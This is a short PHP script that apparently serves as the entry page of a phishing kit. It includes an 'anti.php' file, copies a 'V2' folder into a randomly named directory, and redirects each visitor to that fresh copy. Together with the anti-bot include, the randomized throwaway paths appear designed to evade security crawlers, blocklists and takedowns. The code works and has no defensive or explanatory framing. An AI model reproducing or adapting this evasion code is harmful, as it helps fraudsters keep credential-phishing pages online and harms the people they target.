<?php

session_start();
include("./V2/anti.php");

	function Rand_string($length = 100) {

	    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	    $charactersLength = strlen($characters);
	    $randomString = '';

	    for ($i = 0; $i < $length; $i++)
	    {

	        $randomString .= $characters[rand(0, $charactersLength - 1)];
	    }

	    return $randomString;
	}

    $dst = Rand_string(7);
    function recurse_copy($src,$dst)
    {
	    $dir = opendir($src);
	    @mkdir($dst);
	    while(false !== ( $file = readdir($dir)) ) {
	    if (( $file != '.' ) && ( $file != '..' )) {
	    if ( is_dir($src . '/' . $file) ) {
	    recurse_copy($src . '/' . $file,$dst . '/' . $file);
	    }
	    else {
	    copy($src . '/' . $file,$dst . '/' . $file);
	    }
	    }
	    }
	    closedir($dir);
    }

	$src="V2";
	recurse_copy( $src, $dst );

	header('Location: '.$dst);
?>